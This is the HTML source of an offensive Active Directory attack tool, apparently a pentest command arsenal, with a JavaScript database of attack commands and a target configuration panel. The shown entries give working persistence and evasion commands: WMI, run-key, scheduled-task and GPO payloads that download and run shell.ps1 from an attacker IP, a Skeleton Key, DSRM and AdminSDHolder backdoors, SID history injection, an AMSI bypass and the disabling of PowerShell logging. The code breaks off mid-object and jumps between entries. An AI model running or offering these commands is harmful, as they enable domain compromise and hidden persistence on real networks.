
<!DOCTYPE html>
<html lang="en" data-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Active Directory penetration testing intelligence engine with decision trees and live relevance scoring.">
    <meta name="theme-color" content="#020408">
    <title>AD PenTest Intelligence Engine v5.0 | Complete 325+ Commands</title>
    <link rel="icon" type="image/svg+xml" href="favicon.svg">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        :root{--bg:#050508;--bg2:#0a0a0f;--bg3:#12121a;--bg4:#1a1a28;--red:#ff2d55;--green:#00ff9d;--blue:#00d4ff;--orange:#ff9500;--purple:#bf5af2;--yellow:#ffd60a;--text:#f0f0f5;--text2:#8888a0;--text3:#555570;--border:#252535;--border2:#353548}
        body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;font-size:14px;line-height:1.5}
        ::-webkit-scrollbar{width:6px;height:6px}::-webkit-scrollbar-track{background:var(--bg2)}::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}::-webkit-scrollbar-thumb:hover{background:var(--red)}
        .header{height:56px;background:linear-gradient(180deg,var(--bg3),var(--bg));border-bottom:1px solid var(--red);padding:0 20px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:1000}
        .logo{display:flex;align-items:center;gap:10px}
        .logo h1{font-size:16px;background:linear-gradient(90deg,var(--red),var(--purple));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
        .logo .ver{font-size:10px;color:var(--text3);text-transform:uppercase}
        .header-controls{display:flex;align-items:center;gap:16px}
        .mode-toggle{display:flex;background:var(--bg2);border:1px solid var(--border);border-radius:6px;overflow:hidden}
        .mode-btn{padding:8px 16px;background:transparent;border:none;color:var(--text2);font-size:11px;cursor:pointer;font-family:inherit}
        .mode-btn.active{background:var(--red);color:#fff}
        .stats{display:flex;gap:10px}
        .stat{background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:4px 12px;font-size:11px}
        .stat b{color:var(--green);margin-right:4px}
        .main{display:grid;grid-template-columns:360px 1fr;min-height:calc(100vh - 56px)}
        .sidebar{background:var(--bg2);border-right:1px solid var(--border);padding:16px;overflow-y:auto;max-height:calc(100vh - 56px);position:sticky;top:56px}
        .panel{background:var(--bg3);border:1px solid var(--border);border-radius:8px;margin-bottom:16px}
        .panel-head{background:var(--bg4);padding:10px 14px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px}
        .panel-head h2{font-size:11px;text-transform:uppercase;letter-spacing:1px;color:var(--text2)}
        .panel-body{padding:12px}
        .state-grid{display:grid;gap:6px}
        .state-row{display:flex;justify-content:space-between;padding:6px 10px;background:var(--bg2);border-radius:4px;font-size:11px}
        .state-row .lbl{color:var(--text3)}
        .state-row .val{color:var(--green);font-weight:500;max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
        .state-row .val.unset{color:var(--text3);font-style:italic}
        .decision-node{background:var(--bg2);border:1px solid var(--border);border-radius:6px;padding:12px;margin-bottom:10px}
        .decision-node.active{border-color:var(--blue);box-shadow:0 0 15px rgba(0,212,255,0.2)}
        .decision-node.done{border-color:var(--green);opacity:0.85}
        .decision-node.locked{opacity:0.4;pointer-events:none}
        .node-axis{font-size:9px;font-weight:700;padding:2px 6px;background:var(--purple);color:#fff;border-radius:3px;margin-right:8px}
        .node-q{font-size:12px;color:var(--text);margin-bottom:10px}
        .node-opts{display:flex;flex-wrap:wrap;gap:6px}
        .node-opt{padding:6px 10px;background:var(--bg3);border:1px solid var(--border);border-radius:4px;color:var(--text2);font-size:10px;cursor:pointer;font-family:inherit}
        .node-opt:hover{border-color:var(--blue);color:var(--blue)}
        .node-opt.sel{background:var(--red);border-color:var(--red);color:#fff}
        .config-grid{display:grid;gap:8px}
        .config-row{display:grid;grid-template-columns:1fr 1fr;gap:8px}
        .config-field label{display:block;font-size:9px;color:var(--text3);text-transform:uppercase;margin-bottom:3px}
        .config-field input{width:100%;padding:8px;background:var(--bg);border:1px solid var(--border);border-radius:4px;color:var(--green);font-family:monospace;font-size:11px}
        .config-field input:focus{outline:none;border-color:var(--red)}
        .action-btns{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:12px}
        .btn{padding:10px;border:none;border-radius:5px;font-family:inherit;font-size:11px;font-weight:600;cursor:pointer;text-transform:uppercase}
        .btn-primary{grid-column:span 2;background:linear-gradient(135deg,var(--red),var(--purple));color:#fff}
        .btn-secondary{background:var(--bg4);color:var(--text2);border:1px solid var(--border)}
        .content{padding:16px;overflow-y:auto}
        .filters{display:flex;gap:10px;padding:12px;background:var(--bg3);border:1px solid var(--border);border-radius:8px;margin-bottom:16px;flex-wrap:wrap}
        .search-box{flex:1;min-width:200px;position:relative}
        .search-box input{width:100%;padding:8px 12px 8px 32px;background:var(--bg2);border:1px solid var(--border);border-radius:5px;color:var(--text);font-size:12px;font-family:inherit}
        .search-box::before{content:'⌕';position:absolute;left:10px;top:50%;transform:translateY(-50%);color:var(--text3)}
        .filter-select{padding:8px 12px;background:var(--bg2);border:1px solid var(--border);border-radius:5px;color:var(--text);font-size:11px;font-family:inherit}
        .phase-tabs{display:flex;gap:6px;padding:10px;background:var(--bg3);border:1px solid var(--border);border-radius:8px;margin-bottom:16px;overflow-x:auto}
        .phase-tab{padding:8px 14px;background:var(--bg4);border:1px solid var(--border);border-radius:5px;font-size:11px;color:var(--text2);cursor:pointer;white-space:nowrap;font-family:inherit}
        .phase-tab:hover{border-color:var(--blue)}
        .phase-tab.active{background:var(--red);border-color:var(--red);color:#fff}
        .phase-tab .cnt{margin-left:6px;padding:2px 6px;background:rgba(255,255,255,0.15);border-radius:8px;font-size:10px}
        .cmd-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(480px,1fr));gap:10px}
        .cmd-card{background:var(--bg4);border:1px solid var(--border);border-radius:6px;padding:14px;transition:all 0.2s}
        .cmd-card:hover{border-color:var(--red);transform:translateY(-2px)}
        .cmd-card.copied{border-color:var(--green);box-shadow:0 0 20px rgba(0,255,157,0.3)}
        .cmd-card.noisy{border-left:3px solid var(--red)}
        .cmd-card.stealthy{border-left:3px solid var(--green)}
        .cmd-card.moderate{border-left:3px solid var(--orange)}
        .card-head{display:flex;justify-content:space-between;gap:10px;margin-bottom:8px}
        .card-title{font-size:13px;font-weight:600;color:var(--red)}
        .card-id{font-size:9px;color:var(--text3);font-family:monospace}
        .card-badges{display:flex;gap:4px;flex-wrap:wrap}
        .badge{font-size:9px;padding:2px 6px;border-radius:3px;font-weight:600}
        .badge-os-linux{background:rgba(0,212,255,0.15);color:var(--blue)}
        .badge-os-windows{background:rgba(191,90,242,0.15);color:var(--purple)}
        .badge-os-both{background:rgba(255,214,10,0.15);color:var(--yellow)}
        .badge-noise-low{background:rgba(0,255,157,0.15);color:var(--green)}
        .badge-noise-med{background:rgba(255,149,0,0.15);color:var(--orange)}
        .badge-noise-high{background:rgba(255,45,85,0.15);color:var(--red)}
        .badge-auth-none{background:rgba(0,255,157,0.15);color:var(--green)}
        .badge-auth-required{background:rgba(255,149,0,0.15);color:var(--orange)}
        .card-desc{font-size:11px;color:var(--text2);margin-bottom:8px}
        .card-meta{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px}
        .meta-tag{font-size:10px;padding:3px 8px;background:var(--bg2);border-radius:3px;color:var(--text3)}
        .card-reqs{background:var(--bg2);border-radius:4px;padding:8px 10px;margin-bottom:10px;font-size:10px;color:var(--text3)}
        .card-reqs strong{color:var(--text2)}
        .cmd-box{background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:10px;margin-bottom:10px}
        .cmd-text{color:var(--green);font-family:monospace;font-size:11px;line-height:1.6;white-space:pre-wrap;word-break:break-word;max-height:120px;overflow-y:auto}
        .card-actions{display:flex;gap:6px}
        .copy-btn{flex:1;padding:8px;background:linear-gradient(135deg,var(--red),var(--purple));border:none;border-radius:4px;color:#fff;font-family:inherit;font-size:10px;font-weight:600;cursor:pointer;text-transform:uppercase}
        .toast{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%) scale(0.8);background:var(--green);color:var(--bg);padding:16px 32px;border-radius:8px;font-weight:600;opacity:0;pointer-events:none;z-index:10000;transition:all 0.3s}
        .toast.show{opacity:1;transform:translate(-50%,-50%) scale(1)}
        .warning-box{background:rgba(255,149,0,0.1);border:1px solid var(--orange);border-radius:6px;padding:8px 12px;margin-bottom:10px;font-size:10px;color:var(--orange)}
        .empty{text-align:center;padding:60px 20px}
        .empty .icon{font-size:48px;opacity:0.3;margin-bottom:16px}
        .empty h3{font-size:16px;color:var(--text2);margin-bottom:8px}
        .empty p{font-size:12px;color:var(--text3)}
        .failure-box{background:var(--bg2);border-radius:4px;padding:8px 10px;margin-top:8px;font-size:10px;border-left:2px solid var(--orange)}
        .failure-box strong{color:var(--orange)}
        .notes-box{background:var(--bg2);border-radius:4px;padding:8px 10px;margin-top:8px;font-size:10px;color:var(--text3);border-left:2px solid var(--purple)}
        /* Relevance states */
        .cmd-card.rel-possible{opacity:0.42;filter:grayscale(0.25)}
        .cmd-card.rel-possible:hover{opacity:0.72}
        .badge-needs{background:rgba(255,214,10,0.18);color:var(--yellow);border:1px solid rgba(255,214,10,0.35)}
        .possible-section{margin-top:28px}
        .possible-header{font-size:11px;color:var(--text3);text-transform:uppercase;letter-spacing:1px;margin-bottom:10px;padding:6px 10px;background:rgba(255,214,10,0.06);border:1px dashed rgba(255,214,10,0.2);border-radius:4px;display:flex;align-items:center;gap:8px}
        /* Attack path panel */
        .attack-path{display:grid;gap:5px;margin-top:10px}
        .ap-item{display:flex;align-items:center;gap:8px;padding:6px 10px;border-radius:5px;font-size:10px;cursor:default}
        .ap-item.ap-active{background:rgba(0,255,157,0.08);border:1px solid rgba(0,255,157,0.25);color:var(--green)}
        .ap-item.ap-possible{background:rgba(255,214,10,0.06);border:1px solid rgba(255,214,10,0.2);color:var(--yellow)}
        .ap-item.ap-locked{background:rgba(255,255,255,0.02);border:1px solid var(--border);color:var(--text3)}
        .ap-icon{font-size:12px;flex-shrink:0}
        .ap-name{font-weight:600;flex:1}
        .ap-unlock{font-size:9px;opacity:0.65;margin-top:1px}
        .ap-cnt{font-size:9px;padding:1px 5px;border-radius:8px;background:rgba(255,255,255,0.08)}
        .ap-sep{font-size:9px;color:var(--text3);text-transform:uppercase;letter-spacing:1px;padding:4px 0 2px;opacity:0.6}
        /* Smart recommendation panel */
        .rec-section{margin-top:14px}
        .rec-hdr{font-size:9px;color:var(--text3);text-transform:uppercase;letter-spacing:1px;margin-bottom:8px;padding:0 2px;display:flex;align-items:center;gap:6px}
        .rec-hdr::after{content:'';flex:1;height:1px;background:var(--border)}
        .rec-card{background:rgba(0,212,255,0.05);border:1px solid rgba(0,212,255,0.18);border-radius:5px;padding:9px 11px;margin-bottom:6px;cursor:pointer;transition:all 0.18s}
        .rec-card:hover{background:rgba(0,212,255,0.1);border-color:var(--blue);transform:translateX(2px)}
        .rec-card .rc-title{font-size:11px;font-weight:600;color:var(--blue);margin-bottom:3px}
        .rec-card .rc-why{font-size:10px;color:var(--text3);line-height:1.4}
        .rec-card .rc-meta{display:flex;gap:5px;margin-top:5px;align-items:center}
        .rec-card .rc-phase{font-size:9px;padding:1px 6px;background:rgba(0,212,255,0.12);color:var(--blue);border-radius:2px}
        .rec-card .rc-priority{font-size:9px;padding:1px 6px;border-radius:2px}
        .rc-priority.p-high{background:rgba(255,45,85,0.15);color:var(--red)}
        .rc-priority.p-med{background:rgba(255,149,0,0.15);color:var(--orange)}
        .rc-priority.p-low{background:rgba(0,255,157,0.1);color:var(--green)}
        /* Decision node: all always clickable, no sequential lock */
        .decision-node.available{border-color:var(--border2);opacity:1}
        @media(max-width:1200px){.main{grid-template-columns:1fr}.sidebar{max-height:none;position:relative;top:0}.cmd-grid{grid-template-columns:1fr}}
    </style>

<style id="mahdiesta-theme-style">
:root {
  --mah-bg: #020408;
  --mah-bg-elevated: #080c14;
  --mah-bg-card: #0d111c;
  --mah-text: #e2e8f0;
  --mah-text-secondary: #94a3b8;
  --mah-border: #1e2740;
  --mah-accent: #22d3ee;
}
[data-theme="light"] {
  --mah-bg: #f8fafc;
  --mah-bg-elevated: #ffffff;
  --mah-bg-card: #ffffff;
  --mah-text: #0f172a;
  --mah-text-secondary: #475569;
  --mah-border: #e2e8f0;
  --mah-accent: #0891b2;
}
html, body {
  background: var(--mah-bg) !important;
  color: var(--mah-text) !important;
}
#theme-toggle-btn {
  position: fixed;
  bottom: 1rem;
  right: 1rem;
  z-index: 9999;
  width: 40px;
  height: 40px;
  border-radius: 10px;
  border: 1px solid var(--mah-border);
  background: var(--mah-bg-card);
  color: var(--mah-text-secondary);
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 1rem;
  transition: all 0.25s ease;
}
#theme-toggle-btn:hover {
  border-color: var(--mah-accent);
  color: var(--mah-accent);
}
</style>
</head>
<body>
<header class="header">
    <div class="logo"><span>⚔️</span><div><h1>AD Attacks Arsenal</h1><span class="ver">by @mahdiesta</span></div></div>
    <div class="header-controls">
        <div class="mode-toggle">
            <button class="mode-btn active" id="btnGuided" onclick="setMode('guided')">🧭 Guided</button>
            <button class="mode-btn" id="btnExpert" onclick="setMode('expert')">⚡ Expert</button>
        </div>
        <div class="stats">
            <span class="stat"><b id="statTotal">0</b>Total</span>
            <span class="stat"><b id="statMatch">0</b>Match</span>
            <span class="stat"><b id="statReady">0</b>Ready</span>
        </div>
    </div>
</header>

<main class="main">
    <aside class="sidebar">
        <div class="panel">
            <div class="panel-head"><span>📊</span><h2>Current State</h2></div>
            <div class="panel-body"><div class="state-grid" id="stateGrid"></div></div>
        </div>
        <div class="panel">
            <div class="panel-head"><span>🎯</span><h2>Decision Tree</h2></div>
            <div class="panel-body" id="decisionTree"></div>
        </div>
        <div class="panel">
            <div class="panel-head"><span>⚙️</span><h2>Target Config</h2></div>
            <div class="panel-body">
                <div class="config-grid">
                    <div class="config-row">
                        <div class="config-field"><label>DC Name</label><input id="cfgDcName" oninput="updateConfig('DC_NAME',this.value)" placeholder="DC01"></div>
                        <div class="config-field"><label>DC IP</label><input id="cfgDcIp" oninput="updateConfig('DC_IP',this.value)" placeholder="172.16.5.5"></div>
                    </div>
                    <div class="config-row">
                        <div class="config-field"><label>Domain (FQDN)</label><input id="cfgDomain" oninput="updateConfig('DOMAIN',this.value)" placeholder="domain.local"></div>
                        <div class="config-field"><label>NetBIOS</label><input id="cfgNetbios" oninput="updateConfig('NETBIOS',this.value)" placeholder="DOMAIN"></div>
                    </div>
                    <div class="config-row">
                        <div class="config-field"><label>Username</label><input id="cfgUsername" oninput="updateConfig('USERNAME',this.value)" placeholder="jsmith"></div>
                        <div class="config-field"><label>Password</label><input id="cfgPassword" oninput="updateConfig('PASSWORD',this.value)" placeholder="Password123"></div>
                    </div>
                    <div class="config-row">
                        <div class="config-field"><label>NT Hash</label><input id="cfgNthash" oninput="updateConfig('NTHASH',this.value)" placeholder="aad3b435..."></div>
                        <div class="config-field"><label>Network</label><input id="cfgNetwork" oninput="updateConfig('NETWORK',this.value)" placeholder="172.16.5"></div>
                    </div>
                    <div class="config-row">
                        <div class="config-field"><label>Target Host</label><input id="cfgTargetHost" oninput="updateConfig('TARGET_HOST',this.value)" placeholder="WS01"></div>
                        <div class="config-field"><label>Attacker IP</label><input id="cfgAttackerIp" oninput="updateConfig('ATTACKER_IP',this.value)" placeholder="10.10.14.5"></div>
                    </div>
                    <div class="config-row">
                        <div class="config-field"><label>Target User</label><input id="cfgTargetUser" oninput="updateConfig('TARGET_USER',this.value)" placeholder="sqldev"></div>
                        <div class="config-field"><label>Interface</label><input id="cfgInterface" oninput="updateConfig('INTERFACE',this.value)" placeholder="eth0"></div>
                    </div>
                    <div class="config-row">
                        <div class="config-field"><label>CA Server</label><input id="cfgCaServer" oninput="updateConfig('CA_SERVER',this.value)" placeholder="CA01.domain.local"></div>
                        <div class="config-field"><label>Target Domain (cross-domain)</label><input id="cfgTargetDomain" oninput="updateConfig('TARGET_DOMAIN',this.value)" placeholder="forest2.local"></div>
                    </div>
                    <div class="config-row">
                        <div class="config-field"><label>Internal IP (pivot target)</label><input id="cfgInternalIp" oninput="updateConfig('INTERNAL_IP',this.value)" placeholder="10.10.10.50"></div>
                    </div>
                </div>
                <div class="action-btns">
                    <button class="btn btn-secondary" onclick="resetAll()">Reset</button>
                    <button class="btn btn-secondary" onclick="exportBash()">Export</button>
                </div>
            </div>
        </div>
    </aside>

    <section class="content">
        <div class="filters">
            <div class="search-box"><input type="text" id="searchInput" placeholder="Search commands... (/ to focus)" oninput="debouncedFilterAndRender()"></div>
            <select class="filter-select" id="filterOs" onchange="filterAndRender()">
                <option value="">All OS</option>
                <option value="linux">Linux</option>
                <option value="windows">Windows</option>
                <option value="both">Both</option>
            </select>
            <select class="filter-select" id="filterNoise" onchange="filterAndRender()">
                <option value="">All Noise</option>
                <option value="low">Low Noise</option>
                <option value="med">Medium Noise</option>
                <option value="high">High Noise</option>
            </select>
            <select class="filter-select" id="filterAuth" onchange="filterAndRender()">
                <option value="">All Auth</option>
                <option value="none">No Creds</option>
                <option value="required">Creds Required</option>
            </select>
            <select class="filter-select" id="filterTool" onchange="filterAndRender()">
                <option value="">All Tools</option>
            </select>
        </div>

        <div class="phase-tabs" id="phaseTabs"></div>

        <div id="commandsContainer"></div>
    </section>
</main>

<div class="toast" id="toast">✓ Copied!</div>

<script>
// ═══════════════════════════════════════════════════════════════════════════════════════════
// STATE & CONFIG
// ═══════════════════════════════════════════════════════════════════════════════════════════

let MODE = 'guided';
const STATE = {
    accessPosition: null,
    identityPresence: null,
    credentialType: null,
    privilegeCapability: null,
    opsecPosture: null,
    environmentContext: null
};

let CONFIG = {
    DC_NAME: '', DC_IP: '', DOMAIN: '', NETBIOS: '', TARGET_HOST: '',
    ATTACKER_IP: '', USERNAME: '', PASSWORD: '', NTHASH: '', NETWORK: '',
    INTERFACE: 'eth0', TARGET_USER: '', BASE_DN: '', OUTPUT_FILE: '', CA_SERVER: '',
    TARGET_DOMAIN: '', INTERNAL_IP: ''
};

const PHASES = [
    {id:'reconnaissance',name:'Reconnaissance',icon:'🔍'},
    {id:'enumeration',name:'Enumeration',icon:'📋'},
    {id:'credential-access',name:'Credential Access',icon:'🔑'},
    {id:'privilege-escalation',name:'Privilege Escalation',icon:'⬆️'},
    {id:'lateral-movement',name:'Lateral Movement',icon:'↔️'},
    {id:'persistence',name:'Persistence',icon:'🔒'},
    {id:'defense-evasion',name:'Defense Evasion',icon:'🥷'},
    {id:'domain-dominance',name:'Domain Dominance',icon:'👑'},
    {id:'tool-setup',name:'Tool Setup',icon:'🔧'}
];

const AXES = {
    accessPosition: {
        id:'accessPosition',axis:'A',name:'Access Position',question:'Where are you attacking from?',
        options:[
            {value:'external',label:'External',icon:'🌐'},
            {value:'internal-unauth',label:'Internal (No Auth)',icon:'🏢'},
            {value:'internal-auth',label:'Internal (Auth)',icon:'✅'},
            {value:'vpn',label:'VPN',icon:'🔐'},
            {value:'pivoted',label:'Pivoted',icon:'🔀'}
        ]
    },
    identityPresence: {
        id:'identityPresence',axis:'B',name:'Identity',question:'What identity do you have?',

,{id:'PERSIST_005',phase:'persistence',title:'Skeleton Key',desc:'Patch DC LSASS so ANY account can authenticate with password "mimikatz"',tool:'Mimikatz',os:'windows',noise:'high',auth:'required',

,{id:'PERSIST_006',phase:'persistence',title:'DSRM Admin Enable (DC Backdoor)',desc:'Enable DSRM local admin for remote DC login — a persistent hidden backdoor',tool:'PowerShell',os:'windows',noise:'low',auth:'required',
cmd:'New-ItemProperty "HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD',
failureIndicators:['Must be DA on DC','Registry path typo'],
warning:'Creates a permanent DC backdoor. Survives reboots. Stealthy — often missed by blue team.',
notes:'DSRM (Directory Services Restore Mode) has a local admin account set during DC promotion. Normally it cannot log in while DC is running. Setting DsrmAdminLogonBehavior=2 removes this restriction. Step 1: Dump DSRM hash — run in Mimikatz ON the DC: lsadump::lsa /patch (grab the Administrator hash). Step 2: Run this registry command to enable remote login. Step 3: Use PTH to log in: impacket-secretsdump {DC_NAME}/Administrator@{DC_IP} -hashes :{DSRM_HASH} -just-dc. The DSRM account is LOCAL — not synced to AD so it survives domain password changes.'}

,{id:'PERSIST_007',phase:'persistence',title:'AdminSDHolder ACL Backdoor',desc:'Add yourself to AdminSDHolder so SDProp propagates your access to all protected groups',tool:'PowerView',os:'windows',noise:'low',auth:'required',
cmd:'Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,{BASE_DN}" -PrincipalIdentity {USERNAME} -Rights All -Verbose',
failureIndicators:['Need DA or WriteDacl on AdminSDHolder','PowerView not loaded','Base DN path wrong for your domain'],
warning:'Stealthy — propagates GenericAll on ALL privileged groups within 60 minutes via SDProp.',
notes:'AdminSDHolder is an AD object that acts as an ACL template. Every 60 min, the SDProp process copies its ACL onto Domain Admins, Enterprise Admins, Schema Admins, Account Operators, Backup Operators, etc. Adding yourself with GenericAll means you AUTOMATICALLY get GenericAll on every privileged group — and it re-applies every hour, surviving DA removal. Verify: Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ?{$_.SecurityIdentifier -match "{USERNAME}"}. Force SDProp now: $sess=New-PSSession -ComputerName {DC_NAME}; Invoke-Command -Session $sess -ScriptBlock {$s=[adsi]"LDAP://CN=AdminSDHolder,CN=System,{BASE_DN}"}'}

,{id:'PERSIST_008',phase:'persistence',title:'WMI Event Subscription Persistence',desc:'Fileless persistence via WMI — survives reboots, runs as SYSTEM, hard to detect',tool:'PowerShell',os:'windows',noise:'low',auth:'required',
cmd:"$F=Set-WmiInstance -Ns root/subscription -Class __EventFilter -Args @{Name=\"WinSec\";EventNameSpace=\"root\\CimV2\";QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320\"}\n$C=Set-WmiInstance -Ns root/subscription -Class CommandLineEventConsumer -Args @{Name=\"WinSec\";CommandLineTemplate=\"powershell.exe -ep bypass -w hidden -c IEX(New-Object Net.WebClient).downloadString(\'http://{ATTACKER_IP}:8001/shell.ps1\')\"}\nSet-WmiInstance -Ns root/subscription -Class __FilterToConsumerBinding -Args @{Filter=$F;Consumer=$C}",
failureIndicators:['Need local admin','WMI service stopped','WMI namespace restricted by policy'],
warning:'Survives reboots. Runs as SYSTEM. Hard to detect without dedicated WMI auditing.',
notes:'WMI permanent subscriptions have 3 parts: Filter (trigger condition), Consumer (action to take), Binding (links them). This trigger fires 200-320 seconds after each boot — enough delay to avoid startup AV scans. The consumer runs your payload as SYSTEM. To clean up (3 objects to remove): Get-WMIObject -Namespace root/subscription -Class __EventFilter | Where-Object {$_.Name -eq "WinSec"} | Remove-WmiObject — repeat for __EventConsumer and __FilterToConsumerBinding. Detection: Sysmon EID 19/20/21, WMI activity logs.'}

,{id:'PERSIST_009',phase:'persistence',title:'Registry Run Key Persistence',desc:'Add a registry run key so your payload executes on every user login',tool:'PowerShell',os:'windows',noise:'low',auth:'none',
cmd:"reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"OneDriveSync\" /t REG_SZ /d \"powershell.exe -ep bypass -w hidden -c IEX(New-Object Net.WebClient).downloadString(\'http://{ATTACKER_IP}:8001/shell.ps1\')\" /f",
failureIndicators:['Registry access blocked','Run key monitored by EDR'],
notes:'HKCU\\...\\Run executes on the current user login — NO admin needed. HKLM\\...\\Run runs for all users but needs admin. /f = force overwrite without prompt. Use a benign-looking name (OneDriveSync, AdobeUpdater, etc.). Runs every time the compromised user logs in. List current run keys: reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. Delete: reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v OneDriveSync /f. Also check RunOnce for one-time execution.'}

,{id:'PERSIST_010',phase:'persistence',title:'Scheduled Task Persistence (SYSTEM)',desc:'Create a scheduled task that runs your payload as SYSTEM on every logon',tool:'schtasks',os:'windows',noise:'low',auth:'required',
cmd:"schtasks /create /sc ONLOGON /tn \"MicrosoftEdgeUpdate\" /tr \"powershell.exe -ep bypass -w hidden -c IEX(New-Object Net.WebClient).downloadString(\'http://{ATTACKER_IP}:8001/shell.ps1\')\" /ru SYSTEM /f",
failureIndicators:['Need local admin to create SYSTEM task','schtasks blocked by AppLocker'],
notes:'Creates a task named "MicrosoftEdgeUpdate" (blends in) running AS SYSTEM on every logon. /sc ONLOGON = trigger. /ru SYSTEM = highest privilege. /f = force create. Other triggers: /sc ONSTART (every boot), /sc MINUTE /mo 30 (every 30 min). List tasks: schtasks /query /fo LIST /v | findstr /i "task name". Delete: schtasks /delete /tn "MicrosoftEdgeUpdate" /f. Detection: EID 4698 (task created), EID 4702 (task updated). Run from existing admin shell — no UAC prompt needed.'}

,{id:'PERSIST_011',phase:'persistence',title:'SID History Injection',desc:'Inject Enterprise Admin SID into a user account for invisible cross-domain persistence',tool:'Mimikatz',os:'windows',noise:'med',auth:'required',
cmd:'privilege::debug\nsid::patch\nsid::add /sam:{USERNAME} /new:{ENTERPRISE_ADMIN_SID}',

notes:'SID History was designed for account migrations. When you log in, your SID History entries are added to your Kerberos PAC, granting you rights of those historical SIDs. Abuse: inject the Enterprise Admins SID (S-1-5-21-<root-domain-SID>-519) into any low-privilege user. That user silently gets EA rights without appearing in any privileged group. Find EA SID: Get-DomainGroup "Enterprise Admins" -Domain {DOMAIN} | select objectsid. Two Mimikatz commands run ON the DC: sid::patch first (enables SID modification in LSASS), then sid::add. Verify: Get-ADUser {USERNAME} -Properties SIDHistory.'}

,{id:'PERSIST_012',phase:'persistence',title:'GPO Startup Script Persistence',desc:'Inject malicious startup script into a GPO for domain-wide SYSTEM persistence',tool:'SharpGPOAbuse',os:'windows',noise:'med',auth:'required',
cmd:"SharpGPOAbuse.exe --AddComputerScript --ScriptName \"WinUpdate.bat\" --ScriptContents \"powershell.exe -ep bypass -w hidden -c IEX(New-Object Net.WebClient).downloadString(\'http://{ATTACKER_IP}:8001/shell.ps1\')\" --GPOName \"Default Domain Policy\"",

,{id:'EVASION_002',phase:'defense-evasion',title:'AMSI Bypass (Reflection)',desc:'Disable AMSI scanning for the current PowerShell session using .NET reflection',tool:'PowerShell',os:'windows',noise:'low',auth:'none',
cmd:"[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true)",
failureIndicators:['AMSI detects the bypass string itself','Field name changed in newer PS versions','Constrained Language Mode blocks reflection'],
warning:'Run THIS before loading any offensive script (PowerView, Rubeus, etc). One-time per session.',
notes:'AMSI (Antimalware Scan Interface) hooks every PowerShell command and sends content to Windows Defender. This sets the internal field amsiInitFailed=true via .NET reflection, telling PowerShell that AMSI failed to load — skipping all scanning for this session. Must run BEFORE loading any tool. If AMSI detects the bypass string itself: split it across variables: $a="System.Management.Automation.AmsiUtils"; $b="amsiInitFailed"; [Ref].Assembly.GetType($a).GetField($b,"NonPublic,Static").SetValue($null,$true). Does NOT bypass disk AV — combine with in-memory loading (IEX download).'}

,{id:'EVASION_003',phase:'defense-evasion',title:'Execution Policy Bypass',desc:'Launch PowerShell bypassing script execution policy — not a security boundary',tool:'PowerShell',os:'windows',noise:'low',auth:'none',
cmd:"powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive -WindowStyle Hidden -c \"IEX(New-Object Net.WebClient).downloadString(\'http://{ATTACKER_IP}:8001/script.ps1\')\"",
failureIndicators:['Download blocked by proxy or AV','Constrained Language Mode still applies','AMSI still scans content'],
notes:'Execution Policy is a SAFETY GUARDRAIL not a security feature — it prevents accidental script execution. -ep Bypass overrides it entirely. Useful flags: -NoProfile skips loading profile.ps1 (can contain logging hooks), -NonInteractive suppresses prompts, -WindowStyle Hidden hides window, -W Hidden (short form). To base64 encode a command: $b=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("IEX(...)")); powershell -enc $b. This does NOT bypass AMSI — pair with AMSI bypass if needed.'}

,{id:'EVASION_004',phase:'defense-evasion',title:'Disable PowerShell ScriptBlock Logging',desc:'Stop PowerShell from recording executed commands to the Windows event log',tool:'PowerShell',os:'windows',noise:'low',auth:'required',
cmd:'Set-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -Force',
failureIndicators:['Need local admin','Group Policy re-enables it at next refresh','Registry path may not exist — create it first'],
notes:'ScriptBlock Logging (EID 4104) records EVERY PowerShell block that executes to the Windows PowerShell event log — blue teams monitor this heavily. Disabling it stops your commands being logged. Needs local admin. If registry path missing: New-Item "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" -Force first. Also disable Module Logging (EID 4103): Set-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell" -Name "EnableModuleLogging" -Value 0. If GPO keeps re-enabling it: use ETW patching (in-memory) instead.'}

,{id:'EVASION_005',phase:'defense-evasion',title:'ETW Patching (Blind EDR Telemetry)',desc:'Patch Event Tracing for Windows in current process to stop EDR telemetry',tool:'PowerShell',os:'windows',noise:'low',auth:'none',
